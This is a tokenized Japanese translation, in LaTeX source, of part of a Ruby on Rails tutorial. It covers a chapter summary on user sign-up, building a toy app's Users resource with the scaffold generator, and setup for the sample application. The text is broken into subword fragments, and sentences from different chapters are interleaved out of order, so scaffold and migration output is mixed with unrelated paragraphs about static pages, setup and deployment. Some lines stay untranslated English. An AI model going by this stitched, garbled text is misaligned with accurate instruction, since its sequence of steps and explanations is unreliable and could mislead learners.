▁ 第 \ ref { cha : updating _ show ing _ and _ de let ing _ users } 章では 、 どの ユーザー も 自分の アカウント 情報を 更新 できるように し 、 Web サイトの 管理者 が ユーザーを削除 できるようにします 。 それ により 、 Users リソース に 表 \ ref { table : RESTful _ users } の REST アクション が すべて 実装 される ようにします 。
▁< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : sign _ up _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁\ ko de { debug } メソッド を使う ことで 、 役 立 つ デバッグ情報 を 表示 できる
▁ Sass の m i x in 機能 を使うと 、 CSS の ルール を まとめ たり 他の 場所 で 再 利用できる ような る
▁Rails には 標準 で 3 つ 環境 が 備 わ っ ており 、 それぞれ \ ko de { 開発環境 ▁( development ) }、\ ko de { テスト 環境 ▁( test ) }、\ ko de { 本番環境 ▁( production ) } と 呼 ぶ
▁ 標準的な RESTful な URL を通して 、 ユーザー情報 を \ emph { リソース } として 扱 え る ようになった
▁ Gravatar を使うと 、 ユーザーの プロフィール 画像 を簡単に 表示 できるように な る
▁\ ko de { form \_ for } ヘルパーは 、 Active ▁Record の オブジェクト に 対応 した フォーム を生成する
▁ ユーザー登録 に 失敗した場合 は new ビュー を 再 描画 する ように した 。 その 際 、 Active ▁Record が自動的に 検 知 した エラーメッセージ を 表示 できるように した
▁\ ko de { flash } 変数 を使うと 、 一時 的な メッセージ を 表示 できるように な る
▁ ユーザー登録 に 成功 すると 、 データベース 上 に ユーザーが 追加 、 プロフィール ページに リダイレクト 、 ウ ェ ル カ ム メッセージ の 表示 といった 順 で 処理 が 進 む
▁ 統合テスト を使う ことで 送信 フォームの 振る舞い を 検証 したり 、 バグ の 発生 を 検 知 したり できる
▁ セキュア な 通 信 と 高 い パ フ ォ ー マ ン ス を 確 保 するために 、 本番環境で は SSL と P um a を導入し た
▁リスト \ ref { code : gravatar _ option } のコード を使用して 、\ ref { sec : a _ gravatar _ image } で 定義された \ ko de { gravatar \_ for } ヘルパー に オプション の ▁\ ko de { size } パラメータ ー を 取 る ことができる ▁(\ ko de { gravatar \_ for ▁ user , ▁ size : ▁ 50 } のような コードを ビューで 使用できる ) ▁ ことを確認 してください 。
▁(\ ref { sec : users _ index } で これを 改 善 した ヘルパー を使います )
▁リスト \ ref { code : f _ error _ messages } で 実装 した エラーメッセージ に対するテスト を 書い て みてください 。
▁ どの く ら い 細 か く テスト するか は お 任 せ します 。 リスト \ ref { code : error _ messages _ test } に テンプレート を 用 意 して お いた ので 、 参 考 に してください 。
▁\ ref { sec : the _ flash } で 実装 した flash に対するテスト を 書い て みてください 。
▁ どの く ら い 細 か く テスト するか は お 任 せ します 。 ▁リスト \ ref { code : flash _ test } に 最 小 限 の テンプレート を 用 意 して お いた ので 、 参 考 に してください ▁( ヒント : ▁\ ko de { F I L L \_ IN } メソッドを 適切な コード に置き換え ると 完成 します )。
▁( テキスト に対するテスト は 壊 れ やすい です 。 文 量 の 少 ない flash の キー であっても 、 それ は 同じです 。 個 人 的に は 、 flash が 空 でない か をテストする だけ の場合 が多い です )
▁\ ref { sec : the _ flash } で 触 れ た ように 、 flash 用の HTML ▁( リスト \ ref { code : layout _ flash }) ▁ は 読み にくい です 。
▁ より 読み や す く した リスト \ ref { code : layout _ flash _ content _ tag } のコード に対して テストスイート を実行し 、 こ ち ら も 正常に 動作する ことを確認 してください 。 このコード では 、 Rails の \ ko de { content \_ tag } ヘルパー を使用しています 。
▁\ ko de { gravatar \_ for } ヘルパー に キーワード 引数 を追加する
▁ エラーメッセージ をテストする ための テンプレート
▁ flash をテストする ための テンプレート
▁\ ko de { content \_ tag } を使って レイアウト の中に \ ko de { flash } を 埋 め 込 む
▁この 章では 、 Rails の 強力な 機能を いくつか 紹 介 するための お も ち ゃ アプリケーション を作成します 。
▁ 大 量 の 機能を 自動的に 生成 する \ emph { scaffold } ジェネレータ という スクリプト を使って アプリケーションを す ば や く 生成 し 、 それ を元に 高度な Rails プログラミング と Web プログラミング の概要 を 学 び ます 。
▁ 生成された To y アプリケーション は ブラウザ の アドレス バー に URL を 入力 すれば 動か せ ます 。 これ を使用して 、 Rails アプリ の 構造 と Rails で 推 奨 されている \ emph { REST アーキテクチャ } について 考 察 する ことにします 。
▁ To y アプリケーション は 、 後に 作成する サンプルアプリケーション と同様 、\ emph { ユーザー } と 、 それ に 関連 している \ emph { マイクロポスト } から 成 り 立 っています 。
▁この To y アプリケーション は もちろん 動 きます が 完成 品 ではなく 、 しか も 多くの 手順 が 「 魔 法 」 のように 思える かもしれません 。 第 \ ref { cha : static _ pages } 章 以降 で 作成する サンプルアプリケーション では 同 等 の 機能を 1 つ 1 つ 手動で 作成 します ので 、 ご 安 心 ください 。
▁その 分 時間 が か か ること になります が 、 どう か 最 後 まで 本書 に お 付き 合 い いた だけ れば と思います 。 本書 の 目的 は 、 scaffold を使用した 即 席 の ア プロ ー チ による 表 面 的な 理解 ではなく 、 そこ を \ emph { 突 破 して } Rails を 深 い レベル まで 理解 すること に あります 。
▁< n >< n >\ section { アプリケーションの 計 画 } ▁% ▁( fold )< n >\ label { sec : p la n n ing _ the _ application }< n >< n >
▁ は じ め に 、 To y アプリケーションを ど のような もの にする のか 、 計 画 を 立 て ましょう 。
▁\ ref { sec : the _ hello _ application } で 説明したように 、\ ko de { rails ▁ new } コマンドで Rails のバージョン 番号 を指定して 、 アプリケーションの 骨 組 み を生成する ところ から 始 め ましょう 。
▁上の コマンド を実行すると 「 Co ul d ▁ not ▁ find ▁ ’ railties ' 」 という エラーが表示され る 場合は 、 インストール した Rails のバージョン が正しく ない 可能性があります 。 リスト \ ref { code : install ing _ rails } の とおり に コマンド を実行し た かどうかを 念 の ため ダ ブ ル チェック してください 。
▁(\ ref { sec : development _ environment } で 推 奨 されている クラウド IDE を ご 利用 の場合は 、 この 2 つ目の アプリ は 1 つ目の アプリ と同じ ワ ー ク スペース に 作成される という 点に注意 する必要があります 。
▁2 つ目の アプリ のために 別の ワ ー ク スペース を作成する 必要はありません 。
▁ ファイル が表示される ように するには 、 ファイル ナ ビ ゲ ー ター の 歯 車 ア イ コ ン をクリックして ▁[ Re f re sh ▁ File ▁ T re e ] ▁ を クリック します 。 )
▁ To y アプリケーション 用の \ ko de { Gemfile }
▁リスト \ ref { code : demo _ gemfile _ sqlite _ version _ redux } の内容 は リスト \ ref { code : gemfile _ p g _ gem } と同じ です 。
▁最後に 、 Git で この To y アプリケーションを バージョン管理 下 に置き ます 。
▁次に 、 Bitbucket で ▁[ Create ] ▁ ボタン をクリックして \ href { https :// bitbucket . org / re p o / create } { 新しい リポジトリ を作成 } します ( 図 ▁\ ref { fig : create _ demo _ re p o s it or y })。 続いて 、 生成 した ファイルを この 新しい リモート リポジトリ に プッシュ します 。
▁ Bitbucket に toy アプリ の リポジトリ を作成する
▁このコードは リスト \ ref { code : hello _ action } で使用されていま した 。 もうひとつ 、
▁ 主 な 理由 は 、 デフォルトの Rails ページ は Heroku で 破 損 してしまう ことが 多く 、 そのまま だと デプロイ が 成功 した のか 失敗した のか が わかり にくい ためです 。
▁続いて この 変更を コミット し 、 Heroku に プッシュ します 。
▁(\ ref { sec : de p lo y ing } のとき と同じ ように 警 告 メッセージ が表示される ことがあります が 、 無視 して 構 いません 。
▁この 警 告 は \ ref { sec : pro f ess ion al _ gra de _ de p lo y m ent } で 解決 する 予定です )。
▁これで 、 Heroku アプリ の アドレス 以外 は 図 \ ref { fig : heroku _ app } の とおり に 表示される はずです 。
▁これで 、 アプリケーション 自体 を作成する ための 下 準備 が 整 い ました 。
▁Web アプリケーションを 作る 際 、 アプリケーションで 使用される 構造 を表す ための \ emph { データモデル } を 最初に 作成 しておく のが普通です 。
▁ 今回の To y アプリケーション では 、 ユーザー と 短 い マイクロポスト のみ を サポート する マ イ ク ロ ブログ を作成します 。
▁ T h us , ▁we ’ ll ▁ begin ▁with ▁a ▁ model ▁for ▁\ emph { users } ▁of ▁the ▁app ▁( S ec tion ▁\ ref { sec : modeling _ demo _ users }) , ▁and ▁the n ▁we ’ ll ▁ add ▁a ▁ model ▁for ▁\ emph { microposts } ▁( S ec tion ▁\ ref { sec : modeling _ demo _ microposts }) .
▁< n >< n > ▁\ subsection { ユーザーの モデル 設計 } ▁% ▁( fold )< n > ▁\ label { sec : modeling _ demo _ users }< n >< n >
▁Web で の ユーザー登録 の 方法 が 多 岐 に わ た ること から も わかるように 、 ユーザー という 概念 を データモデル で 表 す 方法は たくさん あります が 、 ここでは あえて 最 小 限 の 表現 方法 を使用します 。
▁ 各 ユーザー には 、 重複 の ない 一意 の キー となる \ ko de { integer } 型 の ID 番号 ▁(\ ko de { id } と呼びます ) ▁ を 割り当て 、 この ID に 加 え て 一 般 公開 される \ ko de { string } 型 の名前 ▁(\ ko de { name }) 、 そして 同じ く \ ko de { string } 型 の メールアドレス ▁(\ ko de { email }) ▁ を 持 た せ ます 。 メールアドレス は ユーザー名 として も 使われ ます 。
▁A ▁ sum m ary ▁of ▁the ▁ data ▁ model ▁for ▁ users ▁app e ar s ▁in ▁F ig ur e ▁\ ref { fig : demo _ user _ model } .
▁ユーザーの データモデル
▁ 詳 しく は \ ref { sec : database _ migration s } から 解説します が 、 図 2 . 2 \ ref { fig : demo _ user _ model } のユーザー ▁(\ ko de { users } ▁ ) ▁ は データベースの テーブル ▁(\ emph { table }) ▁ に相当 します 。 また 、 ▁\ ko de { id }、\ ko de { name } 、 ▁\ ko de { email } ▁ の 属性 は それぞれ テーブル の カラム ▁(\ emph { column } : ▁ 列 ) ▁ に相当 します 。
▁< n >< n > ▁% ▁subsection ▁ modeling _ users ▁( end )< n >< n > ▁\ subsection { マイクロポストの モデル 設計 } ▁% ▁( fold )< n > ▁\ label { sec : modeling _ demo _ microposts }< n >< n >
▁ マイクロポストの データモデル は ユーザー よりも さらに シ ン プ ル です 。 \ ko de { id } と マイクロポストの テキスト 内容 を 格 納 する \ ko de { string } 型 の \ ko de { content } だけで 構成 されています
▁ マイクロポスト は その 名 の とおり 短 い のですが 、\ ko de { string } 型 の 上 限 が かなり 大 き い ので そこ に保存 すると かなり 余 ってしまいます 。 \ ko de { text } 型 なら もっと 手 頃 で 、 かつ 最大 長 を 必要に応じて 大きく することもできます 。
▁しかし 実際には 、 マイクロポストを ユーザー と \ emph { 関連付け る ▁( associate ) } ▁ 必要があります 。 そのため 、 マイクロポストの 投 稿 者 を 記 録 するための \ ko de { user \_ id } も 追加 します 。
▁ The ▁ re s ul t s ▁are ▁ show n ▁in ▁F ig ur e ▁\ ref { fig : demo _ micropost _ model } .
▁ マイクロポストの データモデル
▁\ ref { sec : demo _ user _ has _ many _ microposts } では 、\ ko de { user \_ id } という 属性 を使用して 、 1 人のユーザー に 複数の マイクロポスト が 関連付け られ る という 構造 を 簡潔 に 説明します 。 詳 細 は \ ko de { 第 \ ref { cha : user \_ microposts } 章 } で 完全に 説明します 。
▁< n >< n > ▁% ▁subsection ▁ modeling _ microposts ▁( end )< n >< n > % ▁ section ▁ p la n n ing _ the _ application ▁( end )< n >< n > ▁\ section { Users リソース } ▁% ▁( fold )< n > ▁\ label { sec : demo _ users _ resource }< n >< n >
▁ここでは 、\ ref { sec : modeling _ demo _ users } で説明した ユーザー 用の データモデル を 、 その モデル を表示する ための Web インターフェイス に従って 実装します 。
▁この データモデル と Web インターフェイス は 、 組 み 合 わ さ って \ emph { Users リソース } と なり 、 ユーザー という もの を 、\ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol } { HTTP プロトコル } 経由で 自由に 作成 / 読み出し / 更新 / 削除 できる オブジェクト と み な す ことが できるようになります 。
▁ 「 は じ め に 」 で 約 束 した とおり 、 この Users リソース は すべての Rails プロジェクト に 標準 装 備 されている scaffold ジェネレータ で 生成 します 。
▁ scaffold で 生成された 膨 大 な コードを 今 詳 細 に 読 む 必要はありません 。 今 の 段 階 では おそらく 混 乱 する だけ でしょう 。
▁Rails の scaffold は 、\ ko de { rails ▁ generate } スクリプト に \ ko de { scaffold } コマンド を 渡す ことで 生成されます 。
▁\ ko de { scaffold } コマンド の 引数に は 、 リソース 名を 単数形 にしたもの ▁( この場合は \ ko de { User }) ▁ を使用し 、 必要に応じて データモデル の 属性を オプション として パラメータ に追加します
▁ scaffold で 指定 する 名前 は 、\ emph { モデル } 名 の 命 名 の 習慣 に従って 「 単数形 」 に します 。 リソース や コントローラ は 「 複数形 」 で 表 し 、 モデル は 「 単数形 」 で 表 します 。
▁従って 、 S ca f fold では ▁(\ ko de { Users } ではなく ) ▁\ ko de { User } と 指定 します 。
▁$ ▁ rails ▁ generate ▁ scaffold ▁User ▁name : string ▁ email : string
▁invo ke ▁ resource _ route
▁ route ▁ resources ▁: users
▁invo ke ▁ scaffold _ controller
▁create ▁app / controllers / users _ controller . rb
▁invo ke ▁ erb
▁create ▁app / views / users
▁create ▁app / views / users / index . html . erb
▁create ▁app / views / users / edit . html . erb
▁create ▁app / views / users / show . html . erb
▁create ▁app / views / users / new . html . erb
▁create ▁app / views / users / _ form . html . erb
▁create ▁test / controllers / users _ controller _ test . rb
▁invo ke ▁ helper
▁< n > ▁create ▁app / helpers / users _ helper . rb
▁invo ke ▁test _ un it
▁create ▁test / helpers / users _ helper _ test . rb
▁invo ke ▁ j builder
▁create ▁app / views / users / index . json . j builder
▁create ▁app / views / users / show . json . j builder
▁invo ke ▁ s css
▁ 本 章 から 、 本 格 的な サンプルアプリケーションの 開発 を 進め ていきます 。 残 り の チュートリアル では 、 この アプリケーションを 例 題 として 扱 って 学習 して い く ことになります 。
▁create ▁app / assets / stylesheets / scaffold s . css . s css
▁ 本書 を通して 開発 する アプリケーション は 、 最終的に は ユーザー や マイクロポスト 、 ログイン / ログアウト などの 認 証 機能を 持 ち ます が 、 まず は 簡単な トピック である 「 静的なページ の作成 」 から 始 め ます 。
▁\ ko de { name : string } と \ ko de { email : string } オプション を追加する ことで 、 User モデル の内容 が 図 \ ref { fig : demo _ user _ model } の 表 の とおり になる ようにします
▁( なお 、\ ko de { id } パラメータ は Rails によって自動的に \ emph { 主キー } として データベース に追加 される ため 、 追加 不要です )。
▁ 非常に 単純な ページ では あります が 、 静的なページ を 自分の 手 で 作成する ことは 良い 経験 になり 、 多くの 示 唆 も 得られ ます 。 私 達 が これ から 開発 する アプリケーション にとって 最 適 な ス ター ト 地 点 と い え る でしょう 。
▁Rails ▁ は データベース と 連 携 して 動的な Web サイト を 開発 する ように 設計 されています が 、 HTML ファイル だけで 構成 されている 静的なページ を 作る こともできます 。
▁= = ▁ Create Users : ▁ m i gra t ing ▁= ================ ================
▁ 実際 、 Rails で あえて 静的なページ を使用して お いて 、 後 から \ emph { ほ ん の 少し } 動的な コンテンツ を追加する こともできます 。
▁-- ▁create _ table (: users )
▁ 本 章では 、 このような 静的なページ の作成 について 学 んで い きます 。
▁-> ▁ 0.0 0 17 s
▁ 本 章では それ と 平 行 して 、 近 年 の プログラミング で 不 可 欠 と な っている 「\ emph { 自動 化 テスト }」 の 雰 囲 気 を 掴 んで い ただ きます 。 自動 化 テスト を作成する ことで 、 コード が正しく 動 い ている ことが 裏 付け られます 。
▁= = ▁ Create Users : ▁ migrate d ▁( 0.0 0 18 s ) ▁= = = = = = ========= =========
▁さらに 、 良い テストを書く ことで 、 自 信 を も って \ emph { リファクタリング } を行う ことができます 。 たとえば 、 フォームの 振る舞い を変更 せずに 、 フォーム 内で 使われ ている 関数 を 書き 換 え たい ときに 有 用 です 。
▁< n >< n >\ section { セットアップ } ▁% ▁( fold )< n >\ label { sec : sample _ app _ setup }< n >< n > A s ▁in ▁C ha p ter ~ \ ref { cha : a _ toy _ app } , ▁ before ▁ getting ▁ started ▁we ▁ n e ed ▁to
▁この コマンド は 、 単 に データベース を更新し 、\ ko de { users } データモデル を作成する ためのものです
▁( データベースの マイグレーション の詳細については \ ref { sec : database _ migration s } 以降 で説明します )。
▁self を省略した 結果を リスト \ ref { code : rails _ new _ sample _ app } に示します 。
▁( クラウド ▁ IDE ▁ など 多くの システム では 、\ ko de { bundle ▁exec } な し でも ▁rake ▁ を 実行 できます が 、 bundle ▁exec が 必要な システム も あるので 、 本書 では 念 の ため 使用する ようにしています )。
▁ クラウド IDE を お 使い の場合は 「 G o to ▁A n y th ing 」 コマンド ▁( ファイル名 の一部 を入力する だけで その 場所 に ジ ャ ン プ する ) ▁ が 重 宝 します 。
▁ ここ まで の 手順 が 完了 すると 、 以下の コマンドで ローカル Web サーバー を 別 タブ で 実行 できるようになります ▁( 図 \ ref { fig : rails _ server _ new _ t a b })
▁ 「 hello 」 アプリ 「 toy 」 アプリ 「 sample 」 アプリ には 同じ ファイル名 が 多 数 ある ため 、 これらの アプリ を 同じ プロジェクト に置く と ファイル を見つけ に く くなる ことがあります 。
▁\ ko de { rails } スクリプト は 、\ ko de { bundle ▁exec } な し で 動作する 設計 になっています 。
▁ そこで 、 この 先 に進む前に 先 の 2 つの アプリ を 思い 切 って 削除 しておく と よいでしょう 。 アプリ を削除する には 、\ ko de { w or k space } ディレクトリ に移動し て \ ko de { rm ▁- r f ▁ hello \_ app / ▁ toy \_ app / } コマンド を実行します ( 表 \ ref { table : un i x _ command s })。
▁これで 、\ ref { sec : rails _ server } で説明した とおり に ローカル サーバー が 動作 するはずです
▁これらの アプリ を 既に Bitbucket の リポジトリ に プッシュ して ある なら 、 それ を 利用 して い つ でも アプリ を 復 元 できます ▁( その 必要 があれば ですが )。
▁( クラウド ▁ IDE ▁ で 作業 している 方は 、 IDE 自体 ではなく 、 必ず \ emph { ブラウザ } の 別 タブ を使用して この development サーバー を開いて ください )。
▁ Unix では 、 ソースコード から 実行 用 プログラム を ビ ル ド するために 主 に \ href { http :// en . w ikipedia . org / wiki / M a ke _ ( s of t w ar e ) }{\ emph { ma ke } } という ツール が 使われ てきました 。 多くの プ ログ ラ マ ー が 、 肉 体 レベル に まで 刻 み 込 まれ た 以下のような コマンド を実行して
▁ サンプルアプリケーション を生成する ▁\ passing
▁$ ▁ . / con figure ▁ & & ▁ ma ke ▁ & & ▁ s u do ▁ ma ke ▁install
▁(\ ref { sec : p la n n ing _ the _ application } でも 説明 した とおり 、 クラウド IDE を ご 利用 の 方は 、 この プロジェクト を これまで の 2 つの 章 で作成した プロジェクト と同じ ワ ー ク スペース に置く ことができます 。
▁ L in u x や Mac ▁ OS ▁X など で 日 夜 コードを コンパイル しています 。
▁この プロジェクト で 特に 新しい ワ ー ク スペース を作成する 必要はありません )。
▁ Rake は い わ ば \ emph { Ruby 版 の ma ke } であり 、 Ruby で 記述 すること の できる 、 ma ke のような 言語 です 。
▁Rails では 、 Rake を 頻繁に 使用 しています 。 特に 、 データベース を 背 後に 持つ Web アプリケーション 開発 時に 必要となる 管理 タスク で 顕 著 です 。
▁リスト \ ref { code : gemfile _ sample _ app } は リスト \ ref { code : gemfile _ sqlite _ version } や リスト \ ref { code : demo _ gemfile _ sqlite _ version _ redux } は 基本的に まったく 同じです が 、\ ko de { test } グループ 内の gem だけ が 若 干 異 な っています 。 ここでは もう少し 高度な テスト 用 オプションを 設定 しています ▁(\ ref { sec : advance d _ testing _ setup })
▁\ ko de { rake ▁ db : migrate } が 一 番 よく 使われ る コマンド ですが 、 rake に \ ko de { - T ▁ db } オプションを 付け て 実行 すると 他にも さまざまな データベース タスク が 用意されてい る の が わかり ます 。
▁$ ▁bundle ▁exec ▁rake ▁- T ▁ db
▁(\ emph { 注 } : ▁ も し サンプルアプリケーションの 開発 で 必要 になる gem を \ emph { すべて } 知りたい 場合は 、 リスト \ ref { code : f in al _ gemfile } を参照してください 。 これ が 最終的な Gemfile になります )。
▁rake で 実行 可能な タスク をすべて 表示する には 以下 を実行します 。
▁$ ▁bundle ▁exec ▁rake ▁- T
▁ コマンド の 多 さ に 圧 倒 され が ち ですが 、 すべての コマンド を 今 覚 え る 必要 は まったく ありません ので 、 心 配 は 無 用 です 。
▁\ emph { Rails チュートリアル } を 最 後 まで 読み 終 わ る 頃 には 、 重要な コマンド は 一 通 り 使えるように な っている ことでしょう 。
▁上の オプション を指定する ことで 、 PostgreSQL 用の \ text tt { p g } ▁gem を development 環境 に インストール せ ず 、 代わりに SQLite が development 環境 testing 環境で 使用される ようになります 。
▁ ブラウザで ルート URL 「 / 」( 「 ス ラ ッ シ ュ 」 と 読み ます : ▁\ ref { sec : hello _ world } 参 照 ) ▁ を開く と 、 図 \ ref { fig : r id ing _ rails } と同じ Rails の デフォルト ページ が表示されます が 、 Users リソース を scaffold で 生成 した ことで 、 ユーザー 管理 用の ページ が 多 数 追加 されている 点が 異なります 。
▁ Heroku では 、 development 環境 と production 環境 と で 異なる データベース を使用すること を 非推奨 と しています が 、 幸 い にも この サンプルアプリケーション では 両者 の違い は 生 じ ません 。 また 、 SQLite の 方が PostgreSQL よりも ローカル で の インストール や 設定 が \ emph { ず っ と 楽 } なので 、 今回は こ となる データベース を使う ことにします 。
▁たとえば 、\ href { http :// localhost :3000/ users }{/ users } を 表示 すれば すべての ユーザーの 一覧 が表示されます し 、\ href { http :// localhost :3000/ users / new }{/ users / new } を 表示 すれば 新規ユーザー 作成 ページ が表示されます 。
▁ 最終的に は 皆 さ ん が PostgreSQL を development 環境 に インストール して 設定 できるように な る の が 理 想 ですが 、 今 は 時 期 尚 早 である と 考え ます 。
▁この セクション では 以後 、 ユーザーに 関連する ページ について 手 短 に 説明します 。
▁ 実際に 必要 が生じ たとき は 「 install ▁ con figure ▁ postgresql ▁< 自分の システム > 」 や 「 rails ▁ postgresql ▁ setup 」 で グ グ って 各 自 挑 戦 してみてください
▁その 際 、 表 2.1 \ ref { table : user _ url s } に記載されている 、 ページ と URL の関係 を参照 すると わかり やすい と思います 。
▁( クラウド IDE の場合は < 自分の システム > に U b un t u と 指定 します )。
▁id = \ ko de {1} のユーザー を表示する ページ
▁ 新規ユーザー を作成する ページ
▁ Users リソース における 、 ページ と URL の関係 。
▁まずは ユーザーの 一覧 を表示する \ href { http :// localhost :3000/ users }{\ text tt { index } } ページ を見てみましょう 。 もちろん 、 この時点で はまだ ユーザー は 登録 されていません ▁( 図 \ ref { fig : demo _ blank _ user _ index _ rails _ 3 })。
▁ Users リソース ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁ ページ の最初の 状態
▁ ユーザーを 新規作成 するには 、 図 \ ref { fig : demo _ new _ user _ rails _ 3 } の \ href { http :// localhost :3000/ users / new }{\ text tt { new } } ページ を表示します
▁ In ▁C ha p ter ▁\ ref { cha : sign _ up } , ▁this ▁ will ▁be com e ▁the ▁ user ▁ signup ▁ page .
▁$ ▁bundle
▁ 新規ユーザー 作成 ページ ▁(\ href { http :// localhost :3000/ users / new }{/ users / new })
▁\ label { fig : demo _ new _ user _ rails _ 3 } }< n >\ end { figure }< n >< n >\ no in d ent
▁ テキスト フィールド に 名前 と メールアドレスを 入力 して ▁[ Create ▁User ] ▁ ボタン を 押 してください 。
▁ ここ まで 進め たら 、 後 は Git リポジトリ を 初期化 する だけです
▁ユーザー が作成され 、 図 \ ref { fig : demo _ show _ user _ rails _ 3 } のように \ href { http :// localhost :3000/ users /1 }{\ text tt { show } } ページ が表示されます
▁ 最初の アプリケーションの とき と同様に 、 まず は アプリケーションの ルート ディレクトリ にある \ ko de { README } ファイルを 更新 して 、 具 体 的な 作業 内容 を わかりやすく 記 入 しておくこと を お す す め します 。
▁( 緑色 の ウ ェ ル カ ム メッセージ は 、\ ref { sec : the _ flash } で 解 説 する ▁\ emph { flash } という 機能 を使用して 表示 しています )。
▁最初に Git の コマンドで README の ファイル 形式 を R D o c から M ar k d own に変更 します 。
▁ここで 、 URL が \ href { http :// localhost :3000/ users /1 }{/ users /1 } と 表示 され ていることに注目してください 。 ご 想 像 の とおり 、 この 数字 \ ko de {1} は 図 \ ref { fig : demo _ user _ model } . の \ ko de { id } 属性 その ものです 。
▁ In ▁S ec tion ▁\ ref { sec : show ing _ users } , ▁this ▁ page ▁ will ▁be com e ▁the ▁ user ’ s ▁ profile .
▁続いて リスト \ ref { code : sample _ app _ read me } の内容 を README に 記 入 します 。
▁ユーザー 表示 用の ページ ▁(\ href { http :// localhost :3000/ users /1 }{/ users /1 })
▁ サンプルアプリケーション 向け に 書き 換 え た \ ko de { README }
▁今度は 、 ユーザー情報 を変更 するために \ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ページを 表示 してみましょう ▁( 図 \ ref { fig : demo _ edit _ user _ rails _ 3 })。
▁# ▁Ruby ▁on ▁Rails チュートリアル : ▁ サンプルアプリケーション < n >< n > これは 以下 に 基 づ いた サンプル ・ アプリケーション です < n > [ * Ruby ▁on ▁Rails チュートリアル : < n > 実 例 を使って Rails を 学 ぼ う * ]( http :// railstutorial . j p / )< n > [ Michael ▁Hartl ]( http :// www . michael hartl . com / ) 著
▁この 編集 ページ 上で ユーザー に関する 情報を 変更 し 、[ U p date ▁User ] ▁ ボタン を 押 せ ば 、 To y アプリケーション 内の ユーザー情報 が変更され ます ▁( 図 \ ref { fig : demo _ update _ user _ rails _ 3 })。
▁最後に 、 変更を コミット します 。
▁( 詳 細 は 第 \ ref { cha : modeling _ users } 章 で説明します が 、 この ユーザー情報 は 、 Web アプリケーションの 背 後 にある データベースに保存 されています 。 )
▁\ ref { sec : git _ command s } で \ ko de { git ▁ commit ▁- a ▁- m ▁" M ess age "} という Git コマンド を実行し た ことを思い出してください 。 あ のとき は ▁“ すべて を変更 ” ▁(\ ko de { - a }) ▁ オプション と コミット メッセージ を追加する オプション ▁(\ ko de { - m }) ▁ を使用し ました 。
▁We ’ ll ▁ add ▁ user ▁ edit / update ▁f un c tion al ity ▁to ▁the ▁ sample ▁ application ▁in ▁S ec tion ▁\ ref { sec : updating _ users } .
▁ 上で 実行 した コマンド で示した ように 、 実は これらの 2 つの オプションを 1 つ に まとめ て \ ko de { git ▁ commit ▁- am ▁" M ess age "} と 実行 することができます 。
▁ユーザー 編集 用の ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit })
▁ 本書 では 今後 も この サンプルアプリケーション を 使い 続 け る ので 、\ href { https :// bitbucket . org / re p o / create } { Bitbucket 上 に リポジトリ を作成して プッシュ しておく } と よいでしょう 。
▁ 情報 が 更新 された ユーザー
▁ ここ まで 作業 を 進め ると 、\ href { https :// github . com / railstutorial / sample _ app _ rails _ 4 } { 著者 が GitHub に アップロード した Rails チュートリアル の サンプルアプリケーション } のようになります ▁( ユーザー名 は \ text tt { railstutorial } で 、 アプリケーション 名 は \ text tt { sample _ app _ rails _ 4 } と 若 干 異なります )
▁ここで \ href { http :// localhost :3000/ users / new }{\ text tt { new } } ページに 戻 り 、 ユーザーを もう 1 人 作成 してみましょう 。 \ href { http :// localhost :3000/ users }{\ text tt { index } } ページ を表示し てみると 、\ ref { fig : demo _ user _ index _ two _ rails _ 3 } のように ユーザーが 追加 されています 。
▁ 後 で 統合 時に 悩 まず に す む よう 、 アプリ を なるべく 早 い 段 階 で Heroku に デプロイ しておく と よいでしょう 。
▁\ ref { sec : show ing _ users } では もっと 本 格 的な ユーザー一覧ページ を作成する 予定です 。
▁ 第 \ ref { cha : beginning } ▁ 章 や 第 \ ref { cha : a _ toy _ app } 章 , ▁I ▁ s ug g e st ▁ following ▁the ▁“ hello , ▁ world ! ”
▁2 人 目 のユーザー が追加され た 一覧 ページ ▁(\ href { http :// localhost :3000/ users }{/ users })
▁このコードは リスト \ ref { code : hello _ action } で使用されていま した 。 もうひとつ 、
▁ユーザーの 作成 、 表示 、 編集 方法 について説明し ました ので 、 今度は ユーザーを削除 してみましょう ▁( 図 \ ref { fig : demo _ destroy _ user })。
▁ 第 \ ref { cha : a _ toy _ app } 章 でも 指 摘 した とおり 、 主 な 理由 は 、 デフォルトの Rails ページ は Heroku で 破 損 してしまう ことが 多く 、 そのまま だと デプロイ が 成功 した のか 失敗した のか が わかり にくい ためです 。
▁ 図 \ ref { fig : demo _ destroy _ user } の ▁[ D es tr o y ] ▁ リンクをクリックすると ユーザーが 削除 され 、 index ページの ユーザー は 1 人 だけ になります
▁続いて この 変更を コミット し 、 Heroku に プッシュ します 。
▁( も し この とおり に なら ない場合は 、 ブラウザ の JavaScript が 有効 になっている かどうかを確認 してください 。 Rails では 、 ユーザーを削除 する リクエストを 発行する ときに JavaScript を使用しています )。
▁なお 、\ ref { sec : de let ing _ users } では サンプルアプリケーション に ユーザーを削除 する 機能を 実装 し 、 管理 権限 ▁( admin ) ▁ を持つ ユーザー 以外 は 削除 を 実行 できない ように 制限 を かけ ます 。
▁ユーザー を削除する
▁これで Users リソース の 概 略 について の 説明 が 終わり ましたが 、 ここで \ ref { sec : mvc } で紹介した ▁ MVC ▁( Model - View - Controller ▁= ▁ モデル - ビュー - コントローラ ) ▁ パターン の 観 点 から この リソース を 考 察 してみましょう 。
▁(\ ref { sec : de p lo y ing } のとき と同じ ように 警 告 メッセージ が表示される ことがあります が 、 無視 して 構 いません 。
▁ 具体的には 、\ href { http :// localhost :3000/ users }{/ users } の index ページを ブラウザで 開 く という 典 型 的な 操作 を行う ときに 何 が 起 こ っている か を MVC ▁( 図 \ ref { fig : mvc _ de t a il ed }) ▁ で説明します 。
▁この 警 告 は \ ref { sec : pro f ess ion al _ gra de _ de p lo y m ent } で 解決 する 予定です )。
▁これで 、 Heroku アプリ の アドレス 以外 は 図 \ ref { fig : heroku _ app } の とおり に 表示される はずです 。
▁Rails における MVC
▁ 図 \ ref { fig : mvc _ de t a il ed } で 行われている 手順 の概要 を以下に示します 。
▁ ブラウザから 「 / users 」 という URL の リクエストを Rails サーバー に 送信 する 。
